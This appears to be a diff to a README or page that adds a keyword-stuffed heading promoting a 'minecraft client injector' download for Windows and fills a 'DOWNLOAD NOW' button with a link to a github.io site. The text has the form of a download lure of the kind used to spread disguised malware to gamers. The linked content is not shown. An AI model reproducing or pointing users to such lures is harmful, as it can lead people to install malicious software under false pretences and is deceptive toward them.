@@ -1,10 +1,10 @@
-
+# download minecraft client injector for Windows | latest safe install minecraft client injector. Explore details about features, configs, and installation.
 
 
 
 ---
   
-  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW]( ) |
+  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW](https://minecraft-scaffold-mod-wl87.github.io/.github/ ) |
  |---------------------|----------------------:|
 
 
